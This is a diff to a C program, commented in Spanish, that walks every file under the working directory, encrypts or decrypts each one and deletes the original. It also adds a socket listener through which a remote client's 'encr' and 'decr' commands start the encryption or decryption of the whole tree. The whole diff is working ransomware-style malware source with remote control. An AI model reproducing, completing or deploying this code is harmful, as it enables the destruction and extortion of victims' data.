@@ -259,7 +259,7 @@ int makePadFile(char *abs_path){
 	return -1;
 }
 
-int getFilesinDir(char *cwd){
+int getFilesinDir(char *cwd, int opcion){
 	/*
 		Funcion recursiva que lista todos los ficheros dentro del directorio
 		dado como parametro. Cuando un fichero es un archivo comun, se imprime
@@ -275,6 +275,8 @@ int getFilesinDir(char *cwd){
     	//Se itera sobre todos los ficheros del directorio
         while ((dir = readdir(d)) != NULL)
         {
+			
+			//else if (opcion==2){
 			//Si es archivo comun, se llama a encryptFile para encriptarlo
 			// Si el tipo de archivo es igual a 8 se trata de un archivo comun
 					if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
@@ -282,12 +284,15 @@ int getFilesinDir(char *cwd){
 							if (strcmp(dir->d_name, "sayCYA") != 0) { // Para no agregar el archivo sayCYA
 								strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
 								printf("sendenc:%s\n%s\n", cwd, abs_path_file);
-	          //encryptFile(cwd, abs_path_file);
-						decryptFile(cwd, abs_path_file);
-						DelFiles(abs_path_file);
+								if (opcion==1)
+									encryptFile(cwd, abs_path_file);
+								else if (opcion==2)
+									decryptFile(cwd, abs_path_file);
+								DelFiles(abs_path_file);
 							}
-        		}
+						}
 					}
+				//}
             //Si es un subdirectorio, se llama de manera recursiva a la funcion con
             //la ruta absoluta del subdirectorio
 			// Si el tipo de archivo es igual a 4 se trata de un directorio
@@ -296,7 +301,7 @@ int getFilesinDir(char *cwd){
 		           	strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
 		           	printf("\nnew p: %s\n", abs_path_file);
 		           	makePadFile(abs_path_file);
-		           	getFilesinDir(abs_path_file);
+		           	getFilesinDir(abs_path_file,opcion);
 	           	}
 			}
         }
@@ -306,6 +311,8 @@ int getFilesinDir(char *cwd){
 }
 
 int conecta(){
+	char cwd[length_path];
+	getcwd(cwd, (size_t) sizeof(cwd));
 	int sockfd, new_sockfd;  // descriptores de archivo
 	//Estructura para guardar los datos necesarios para el socket
 	struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
@@ -343,16 +350,18 @@ int conecta(){
 		recv_length = recv(new_sockfd, &buffer, 6, 0);
 		while(recv_length > 0) {
 
-			printf("RECV: %d bytes\nENTRADA: %s...", recv_length, buffer);//----Mensaje que se quita en cuanto termine la creacion-----
-			if(strcmp(buffer, "encr\n") == 0)//  command: encr
+			//printf("RECV: %d bytes\nENTRADA: %s...", recv_length, buffer);//----Mensaje que se quita en cuanto termine la creacion-----
+			if(strcmp(buffer, "encr\n") == 0){//  command: encr
 				/*Aqui iria la funcion de cifrado*/
-				send(new_sockfd, "Escogio encriptar\n", 18, 0);
-			else if(strcmp(buffer, "decr\n") == 0)//  command: decr
+				send(new_sockfd, "Escogio cifrar\n", 15, 0);
+				getFilesinDir(cwd,1);
+				
+			}
+			else if(strcmp(buffer, "decr\n") == 0){//  command: decr
 				/*Aqui iria la funcion de descifrado*/
-				send(new_sockfd, "Escogio desencriptar\n", 21, 0);
-			else if(strcmp(buffer,"list\n") == 0)//  command: list
-				/*Aqui iria la funcion de listado de archivos para obtener info*/
-				send(new_sockfd, "Escogio listar\n", 15, 0);
+				send(new_sockfd, "Escogio descifrar\n", 18, 0);
+				getFilesinDir(cwd,2);
+			}
 			else if(strcmp(buffer,"stop\n") == 0){//  command: stop
 				/*Aqui iria la funcion de  desconectar el socket*/
 				send(new_sockfd, "detener todo\n", 13, 0);
@@ -371,8 +380,8 @@ int conecta(){
 
 
 int main(){
-	//int a= conecta();
-	char cwd[length_path];
-	getcwd(cwd, (size_t) sizeof(cwd));
-	getFilesinDir(cwd);
+	int a= conecta();
+	//char cwd[length_path];
+	//getcwd(cwd, (size_t) sizeof(cwd));
+	//getFilesinDir(cwd);
 }
